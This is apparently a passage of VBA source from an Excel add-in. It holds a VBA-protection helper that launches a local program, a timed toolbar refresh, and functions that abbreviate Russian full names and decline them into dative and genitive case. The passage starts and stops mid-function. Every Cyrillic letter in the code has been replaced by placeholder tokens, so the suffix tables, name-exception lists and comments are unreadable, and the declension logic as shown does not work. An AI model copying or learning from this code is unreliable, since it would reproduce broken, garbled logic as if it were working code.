    CreateObject("wscript.shell").Run """" & ProgramPath$ & """", , True

    Kill TemporaryFilename$
    If FilenamesCollection(folder$).Count = 0 Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|": Exit Function

    NewFile$ = FilenamesCollection(folder$)(1)
    Name NewFile$ As folder$ & filename$

    If Dir(folder$ & filename$) = "" Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & filename$ & "": Exit Function

    ProtectVBA = folder$ & filename$
End Function

Sub UpdateAddinToolbar(Optional ByVal DelayInSeconds As Double = 0.6)
    On Error Resume Next: DelayInHours$ = Replace(Format(CDbl(TimeSerial(0, 0, 1)) * DelayInSeconds, "0.000000000"), ",", ".")
    Macro = "ON.TIME(NOW()+" & DelayInHours$ & ", ""'" & ThisWorkbook.Name & "'!" & "CreateProgramCommandBar"")"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ExecuteExcel4Macro Macro        ' macro = ON.TIME(NOW()+0.000003472, "CreateProgramCommandBar")
End Sub

Sub SetDefaultSetting(ByVal SettingName, ByVal SettingValue)
    On Error Resume Next: Err.Clear
    Const NO_SETTING_VALUE$ = "value is absent"
    If GetSetting(PROJECT_NAME$, "Settings", SettingName, NO_SETTING_VALUE$) = NO_SETTING_VALUE$ Then
        SaveSetting PROJECT_NAME$, "Settings", SettingName, SettingValue
    End If
End Sub


Attribute VB_Name = "mod_BaseForSheetFunctions"
Option Compare Text        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
Option Private Module

Public avOne, avTeens, avTens, avHundreds, avThousands

Public Function CropFIO(ByVal s, Optional ToLeft As Boolean = False) As String

    Dim sv As Variant, s|fffd| As String, s|fffd| As String, s|fffd| As String, i As Long, k As Long
    Application.Volatile True

    If InStr(s, ".") > 0 Or Len(Trim$(s)) = 0 Then
        CropFIO = s        'CropFIO |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        Exit Function
    End If
    '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    s = Replace(Application.Trim(s), Chr(30), "-")
    s = Replace(Replace(s, " -", "-"), "- ", "-")
    s = Replace(Replace(s, "' ", "'"), " '", "'")        ' |fffd| '|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|; |fffd|' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|; |fffd|' |fffd||fffd||fffd||fffd|; |fffd|' |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    sv = Split(s)
    s|fffd| = vbNullString: s|fffd| = vbNullString: s|fffd| = vbNullString

    i = UBound(sv)
    If i < 1 Then CropFIO = s: Exit Function

    Select Case sv(i)
        Case "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|"
            '|fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd||fffd|, |fffd||fffd|, |fffd||fffd||fffd|
            i = i - 1
            s|fffd| = UCase(Left$(sv(i), 1)) & "."
            i = i - 1
        Case "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|"
            i = i - 1
        Case Else
            Select Case Right$(sv(i), 3)
                Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|"        ' + |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    If i >= 2 Then        '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        s|fffd| = |fffd|ropWord(sv(i))
                    Else        '|fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        s|fffd| = |fffd|ropWord(sv(i)): s|fffd| = sv(0)
                    End If
                    i = i - 1
                Case Else
                    k = InStr(sv(i), "-")
                    If k > 0 Then
                        Select Case Mid$(sv(i), k + 1)
                            Case "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd|"
                                '|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|-|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd|-|fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|
                                s|fffd| = UCase(Left$(sv(i), 1)) & "."
                                i = i - 1
                                If i = 0 Then
                                    s|fffd| = s|fffd|
                                    s|fffd| = vbNullString
                                End If
                        End Select
                    ElseIf i > 2 Then
                        Select Case sv(i - 1)
                            Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|"
                                s|fffd| = UCase(Left$(sv(i), 1)) & "."        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                                i = i - 2
                        End Select
                    Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        s|fffd| = UCase(Left$(sv(i), 1))
                        If Len(sv(i)) > 1 Then s|fffd| = s|fffd| & "."
                        i = i - 1
                    End If
            End Select
    End Select

    Select Case sv(0)
        Case "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "c|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd|"
            If i >= 2 Then
                s|fffd| = sv(0) & " " & StrConv(sv(1), vbProperCase)
                s|fffd| = |fffd|ropWord(sv(2))
            Else        '|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If Len(s|fffd|) > 0 Then
                    s|fffd| = sv(0) & " " & StrConv(sv(1), vbProperCase)
                Else
                    s|fffd| = StrConv(sv(0), vbProperCase): s|fffd| = |fffd|ropWord(sv(1))
                End If
            End If
        Case Else
            If Len(s|fffd|) = 0 Then        '|fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                s|fffd| = StrConv(sv(0), vbProperCase)
                If Len(s|fffd|) = 0 Then s|fffd| = |fffd|ropWord(sv(1))
            End If
    End Select
    If ToLeft Then CropFIO = s|fffd| & s|fffd| & " " & s|fffd| Else CropFIO = s|fffd| & " " & s|fffd| & s|fffd|
End Function

Public Function |fffd|ropWord(s As Variant) As String
    If Len(s) = 1 Then
        |fffd|ropWord = s
    Else
        ss$ = UCase(Left$(s, 1)) & ".": k = InStr(s, "-")
        If k > 0 Then ss$ = ss$ & "-" & Mid$(s, k + 1, 1) & "."
        |fffd|ropWord = ss$
    End If
End Function

Function DativeCase(sSurname$, Optional sName$, Optional sPatronymic$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: sSurname - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, sName - |fffd||fffd||fffd|, sPatronymic - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| 2013 EducatedFool

    Application.Volatile True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sSurname$ = Replace(sSurname$, " - ", "-"): sSurname$ = Replace(Replace(sSurname$, " -", "-"), "- ", "-")

    On Error Resume Next
    If sName$ = "" And sPatronymic$ = "" Then
        arr = Split(Application.Trim(sSurname$))
        sSurname$ = arr(0): sName$ = arr(1): sPatronymic$ = Replace(arr(2), ".", "")
    End If

    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:   |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| "|fffd||fffd||fffd|" |fffd||fffd||fffd| "|fffd||fffd||fffd||fffd|" - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
    Dim bMaleSex As Boolean:        ' bMaleSex = (Right(sPatronymic, 1) = "|fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")
    bMaleSex = Not (Right(sPatronymic, 2) = "|fffd||fffd|" Or Right(sPatronymic, 3) = "|fffd||fffd||fffd|")

    If Len(sSurname) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        arrSurname = Split(sSurname, "-")
        For i = LBound(arrSurname) To UBound(arrSurname)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            sRes = "": sSurnamePart = arrSurname(i)

            If bMaleSex Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", ChrW(1110): sRes = sSurnamePart
                    Case "|fffd|", "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|", "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If UBound(arrSurname) > 0 And i = 0 Then sRes = sSurnamePart
                    Case Else: sRes = sSurnamePart & "|fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|][!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = sSurnamePart & "|fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                        If Len(sSurnamePart) <= 4 Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If Right(sSurnamePart, 3) = "|fffd||fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                End Select

            Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
                         "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case Else: sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                End Select

            End If

            ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd|" Then sRes = sSurnamePart

            arrSurname(i) = sRes
        Next
        DativeCase = Join(arrSurname, "-") & " "        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    End If

    If Len(sName) > 0 Then        '   |fffd||fffd||fffd|
        NameException$ = GetDativeException(sName)
        If Len(NameException$) Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            DativeCase = DativeCase & NameException$
        Else        ' |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If bMaleSex Then
                Select Case Right(sName, 1)
                    Case "|fffd|", "|fffd|": DativeCase = DativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|", "|fffd|": DativeCase = DativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": DativeCase = DativeCase & sName
                    Case Else: DativeCase = DativeCase & sName & "|fffd|"
                End Select
            Else
                Select Case Right(sName, 1)
                    Case "|fffd|", "|fffd|"
                        If Mid(sName, Len(sName) - 1, 1) = "|fffd|" Then
                            DativeCase = DativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                        Else
                            DativeCase = DativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                        End If
                    Case "|fffd|": DativeCase = DativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case Else: DativeCase = DativeCase & sName
                End Select
            End If
        End If
        DativeCase = DativeCase & " "
    End If

    If Len(sPatronymic) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Right(sPatronymic, 3) = ChrW(1201) & "|fffd||fffd|" Or Right(sPatronymic, 4) = ChrW(1179) & "|fffd||fffd||fffd|" _
           Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Then
            DativeCase = DativeCase & sPatronymic
        Else
            If bMaleSex Then
                DativeCase = DativeCase & sPatronymic & "|fffd|"
            Else
                DativeCase = DativeCase & Mid(sPatronymic, 1, Len(sPatronymic) - 1) & "|fffd|"
            End If
        End If
    End If
    DativeCase = Replace(DativeCase, "-", "- ")
    DativeCase = StrConv(DativeCase, vbUnicode + vbProperCase)
    DativeCase = Replace(DativeCase, "- ", "-")
End Function

Function GetDativeException(ByVal txt$) As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Select Case txt$
        Case "|fffd||fffd||fffd||fffd||fffd|": GetDativeException = "|fffd||fffd||fffd||fffd||fffd|"
        Case "|fffd||fffd||fffd|": GetDativeException = "|fffd||fffd||fffd||fffd|"
        Case "|3f8||fffd||fffd|": GetDativeException = "|fffd||fffd||fffd||fffd||fffd|"

            ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|": GetDativeException = txt$
    End Select
End Function


Function GenitiveCase(sSurname$, Optional sName$, Optional sPatronymic$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: sSurname - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, sName - |fffd||fffd||fffd|, sPatronymic - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| 2013 EducatedFool

    Application.Volatile True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sSurname$ = Replace(sSurname$, " - ", "-"): sSurname$ = Replace(Replace(sSurname$, " -", "-"), "- ", "-")

    On Error Resume Next
    If sName$ = "" And sPatronymic$ = "" Then
        arr = Split(Application.Trim(sSurname$))
        sSurname$ = arr(0): sName$ = arr(1): sPatronymic$ = Replace(arr(2), ".", "")
    End If

    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:   |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| "|fffd||fffd||fffd|" |fffd||fffd||fffd| "|fffd||fffd||fffd||fffd|" - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
    Dim bMaleSex As Boolean:        ' bMaleSex = (Right(sPatronymic, 1) = "|fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")
    bMaleSex = Not (Right(sPatronymic, 2) = "|fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")

    If Len(sSurname) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        arrSurname = Split(sSurname, "-")
        For i = LBound(arrSurname) To UBound(arrSurname)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            sRes = "": sSurnamePart = arrSurname(i)

            If bMaleSex Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If UBound(arrSurname) > 0 And i = 0 Then sRes = sSurnamePart
                    Case Else: sRes = sSurnamePart & "|fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|][!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = sSurnamePart & "|fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart
                    Case "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                        If Len(sSurnamePart) <= 4 Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If Right(sSurnamePart, 3) = "|fffd||fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                End Select

            Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
                         "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd|"
                    Case Else: sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                End Select

            End If

            ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd|" Then sRes = sSurnamePart

            arrSurname(i) = sRes
        Next
        GenitiveCase = Join(arrSurname, "-") & " "        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    End If

    If Len(sName) > 0 Then        '   |fffd||fffd||fffd|
        NameException$ = GetGenitiveException(sName)
        If Len(NameException$) Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            GenitiveCase = GenitiveCase & NameException$
        Else        ' |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If bMaleSex Then
                Select Case Right(sName, 1)
                    Case "|fffd|", "|fffd|": GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|": GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|": GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
